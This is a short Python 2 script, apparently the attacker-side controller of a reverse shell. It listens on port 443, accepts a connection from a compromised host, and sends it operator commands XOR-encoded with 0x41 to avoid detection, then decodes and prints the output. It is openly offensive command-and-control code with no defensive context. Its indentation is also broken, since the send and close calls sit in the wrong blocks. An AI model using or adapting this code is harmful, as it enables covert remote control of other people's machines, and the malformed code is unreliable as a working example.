import socket

def attacker():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind( ('0.0.0.0', 443) )
	s.listen(2048)
	print 'listening on port 443...'
	( client, (ip, port) ) = s.accept()
	print 'received connection from ', ip
	while True:
    	command = raw_input('~$ ')

	    # encode data and send it
    	en_command = bytearray(command)
    	for i in range( len(en_command) ):
        	en_command[i] ^= 0x41
    		client.send(en_command)
    
    	# decode data and print it
    	en_code = client.recv(2048)
    	de_code = bytearray(en_code)
    	for i in range( len(de_code) ):
        	de_code[i] ^= 0x41
    	print de_code

		client.close()
		s.close()

def main():
	attacker()

if __name__ == "__main__":
	main()
